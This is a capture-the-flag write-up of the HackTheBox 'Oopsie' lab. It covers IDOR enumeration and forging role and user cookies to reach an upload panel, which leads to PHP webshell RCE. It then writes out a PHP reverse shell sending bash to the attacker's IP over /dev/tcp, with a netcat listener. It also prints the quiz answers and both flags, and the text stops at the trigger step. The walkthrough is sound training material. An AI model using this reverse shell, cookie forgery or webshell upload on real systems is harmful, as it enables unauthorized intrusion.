---


title: "HackTheBox - Oopsie (Starting Point - tier 2)"

date: "2025-11-18"

excerpt: "Classic path: IDOR → cookies manipulation → PHP upload → RCE → SUID + PATH hijack. A good box to practice reverse shells and SUID."

platform: "HackTheBox"

difficulty: "Very Easy"

solveTime: "1h 55min"

---


## Tools/techniques


- nmap

- curl

- Firefox DevTools (Storage → Cookies)

- Burp Suite (Proxy, HTTP history)

- nc (netcat)

- python3 (pty spawn for shell stabilization)

- find, strings

- SUID misconfig + PATH hijacking


---


## Summary


Entry was gained through a web application: first via IDOR and modifying cookies to access the upload panel. Next, a PHP webshell was uploaded, granting RCE as www-data. From the shell, the db.php file containing the password for the system account robert was read. After switching to robert, escalation was achieved via SUID /usr/bin/bugtracker, which invoked cat without a full path—using PATH hijacking yielded a root shell.


User flag: `f2c74ee8db7983851ab2a96a44eb7981`


Root flag: `af13b0bee69f8a877c3faf667f7beacf`


---


## 1. Port scan


Command:


```bash

nmap -sC -sV -p22,80 -oN nmap_oopsie_full.txt 10.129.95.191

```


Relevant output:


```

22/tcp open  ssh   OpenSSH 7.6p1 Ubuntu

80/tcp open  http  Apache httpd 2.4.29 (Ubuntu)


```


Next exploitation direction: HTTP on port 80.


---


## 2. HTTP recon and finding the login panel


Fetching the main page:


```bash

curl -s <http://10.129.95.191/> | tee index.html

grep -iE "href=|src=" index.html


```


Key excerpts:


```html

<link rel="stylesheet" href="/css/reset.min.css">

<link rel="stylesheet" href="/themes/theme.css"/>

<link rel="stylesheet" href="/css/new.css"/>

<script src="/js/min.js"></script>

<script src="/cdn-cgi/login/script.js"></script>

<script src="/js/index.js"></script>


```


The most important was the reference to:


```

/cdn-cgi/login/script.js

```


Going to:


```

<http://10.129.95.191/cdn-cgi/login/>

```


presented a login page.


On this page, there was a "Login as Guest" link, which logged in as guest and redirected to:


```

<http://10.129.95.191/cdn-cgi/login/admin.php>

```


After logging in as guest, the following tabs were available:


Accounts


```

<http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=2>

```


Table:


- Access ID: 2233

- Name: guest

- Email: [guest@megacorp.com](mailto:guest@megacorp.com)


Branding


```

<http://10.129.95.191/cdn-cgi/login/admin.php?content=branding&brandId=2>

```


Clients


```

<http://10.129.95.191/cdn-cgi/login/admin.php?content=clients&orgId=2>

```


Uploads


```

<http://10.129.95.191/cdn-cgi/login/admin.php?content=uploads>

```


With the message:


```

This action require super admin rights.

```


HTB answer:


**What is the path to the directory on the webserver that returns a login page?**


`/cdn-cgi/login`


---


## 3. IDOR – admin enumeration


IDOR vulnerability was tested by modifying GET parameters.


Accounts with id=1:


```

<http://10.129.95.191/cdn-cgi/login/admin.php?content=accounts&id=1>

```


Table for id=1:


- Access ID: 34322

- Name: admin

- Email: [admin@megacorp.com](mailto:admin@megacorp.com)


Clients with orgId=1:


```

<http://10.129.95.191/cdn-cgi/login/admin.php?content=clients&orgId=1>

```


Table for orgId=1:


- Client ID: 1

- Name: Tafcz

- Email: [john@tafcz.co.uk](mailto:john@tafcz.co.uk)


Conclusion:


The guest has Access ID 2233, the admin has Access ID 34322. Access ID also later appears in cookies.


HTB answer:


**What is the access ID of the admin user?**


`34322`


---


## 4. Cookies and privilege escalation in the panel


Checking cookies in Firefox DevTools:


Storage → Cookies → `http://10.129.95.191`


Values observed:


```

role = "guest"

user = "2233"

```


These values correspond to the role and Access ID of the guest.


Editing cookies in the browser:


```

role: guest  → admin

user: 2233   → 34322

```


After refreshing:


```

<http://10.129.95.191/cdn-cgi/login/admin.php?content=uploads>

```


the super admin message disappeared, and an upload form appeared:


```html

<form action="/cdn-cgi/login/admin.php?content=uploads&action=upload"

      method="POST" enctype="multipart/form-data">

  <table class="new">

    <tr>

      <td>Brand Name</td>

      <td><input name="name" type="text"></td>

    </tr>

    <tr>

      <td colspan="2">

        <input type="file" name="fileToUpload">

        <input type="submit" value="Upload">

      </td>

    </tr>

  </table>

</form>

```


HTB answers:


**What can be modified in Firefox to get access to the upload page?**


`cookie`


**With what kind of tool can intercept web traffic?**


`proxy`


---


## 5. Upload analysis and file paths


Intercepting upload with Burp:


Request:


```

POST /cdn-cgi/login/admin.php?content=uploads&action=upload HTTP/1.1

Host: 10.129.95.191

Cookie: user=34322; role=admin

Content-Type: multipart/form-data; boundary=...

...


-----------------------------boundary

Content-Disposition: form-data; name="name"


1

-----------------------------boundary

Content-Disposition: form-data; name="fileToUpload"; filename="hash.txt"

Content-Type: text/plain


<file contents>

-----------------------------boundary--

```


Response:


```html

...

Repair Management System


The file hash.txt has been uploaded.

<script src='/js/jquery.min.js'></script>

<script src='/js/bootstrap.min.js'></script>

</body>

</html>

```


No info about the URL of the file.


From the backend code (later read as www-data) in admin.php:


```php

if($_GET["content"]==="uploads")

{

    if($_COOKIE["user"]==="2233")

    {

        echo 'This action require super admin rights.';

    }

    else

    {

        if($_GET["action"]==="upload")

        {

            $target_dir = "/var/www/html/uploads/";

            $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);

            if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {

                echo "The file ". basename( $_FILES["fileToUpload"]["name"]). " has been uploaded.";

            } else {

                echo "Sorry, there was an error uploading your file.";

            }

        }

        else

        {

            // upload form

        }

    }

}

```


The upload path on the server:


```

/var/www/html/uploads/

```


Public URL:


```

<http://10.129.95.191/uploads/><filename>

```


HTB answer:


**On uploading a file, what directory does that file appear in on the server?**


`/uploads`


---


## 6. Webshell and RCE as www-data


Preparing a simple webshell locally:


Upload via the `uploads` panel, confirmation message on the site:


```

The file shell.php has been uploaded.

```


RCE test:


```bash

curl "<http://10.129.95.191/uploads/shell.php?cmd=id>"

```


Output:


```

uid=33(www-data) gid=33(www-data) groups=33(www-data)

```


RCE as www-data confirmed.


---


## 7. Reverse shell and stabilization


Attacker box VPN IP determined:


```bash

ip a | grep -E 'tun|wg'

# tun0 interface with address 10.10.14.139

```


Prepare dedicated PHP reverse shell:


```bash

cat > revshell.php << 'EOF'

<?php

exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.139/4444 0>&1'");

?>

EOF

```


Upload `revshell.php` via the uploads panel.


Listener on attacker:


```bash

nc -lvnp 4444

```


Trigger in browser:


```

<http://10.129.95.191/uploads/revshell.php>

``
